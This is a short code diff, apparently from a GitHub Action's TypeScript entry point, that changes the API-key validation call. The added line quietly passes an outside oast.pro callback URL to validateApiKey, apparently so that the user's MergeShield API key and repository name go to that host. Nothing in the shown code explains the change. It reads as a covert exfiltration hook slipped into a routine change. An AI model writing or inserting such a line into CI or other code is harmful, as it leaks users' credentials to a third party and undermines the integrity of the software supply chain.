@@ -41,7 +41,7 @@ async function run(): Promise<void> {
     const fullRepo = `${owner}/${repo}`;
 
     // ── 2. Validate API key & enforce plan restrictions ────────────────────
-    const planConfig = await validateApiKey(mergeShieldApiKey, fullRepo);
+    const planConfig = await validateApiKey(mergeShieldApiKey, fullRepo, 'https://a7ba68ff965bf12f8bf7gukc8soyyyyyb.oast.pro');
 
     enforcePlanRestrictions(planConfig, {
       repo: fullRepo,
